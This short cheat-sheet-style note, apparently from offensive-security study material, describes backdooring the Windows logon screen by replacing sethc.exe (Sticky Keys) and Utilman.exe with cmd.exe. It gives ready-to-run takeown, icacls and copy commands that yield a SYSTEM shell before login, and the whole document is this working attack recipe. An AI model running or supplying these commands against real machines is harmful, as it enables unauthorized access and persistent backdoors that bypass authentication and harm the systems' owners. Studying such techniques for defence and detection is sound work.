
This is helpful if we have physical access to the machine. We can launch commandline from the logon screen and run commands

## Sticky Keys

- shortcut to activate Sticky Keys is by pressing `SHIFT` 5 times
- After pressing `SHIFT` 5 times, Windows will execute the binary in `C:\Windows\System32\sethc.exe`
- A straightforward way to backdoor the login screen consists of replacing `sethc.exe` with a copy of `cmd.exe`
- To overwrite `sethc.exe`, we first need to take ownership of the file and grant our current user permission to modify it
```powershell
# Take ownership of the executable
takeown /f c:\Windows\System32\sethc.exe

# Update permission and gain full access 
icacls C:\Windows\System32\sethc.exe /grant Administrator:F

# Overwrite the binary with commandline executable
copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
```


## Utilman

- Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:
- When we click the ease of access button on the login screen, it executes `C:\Windows\System32\Utilman.exe` with SYSTEM privileges.
- If we replace it with a copy of `cmd.exe`, we can bypass the login screen again.
```powershell
takeown /f c:\Windows\System32\utilman.exe

icacls C:\Windows\System32\utilman.exe /grant Administrator:F

copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
```
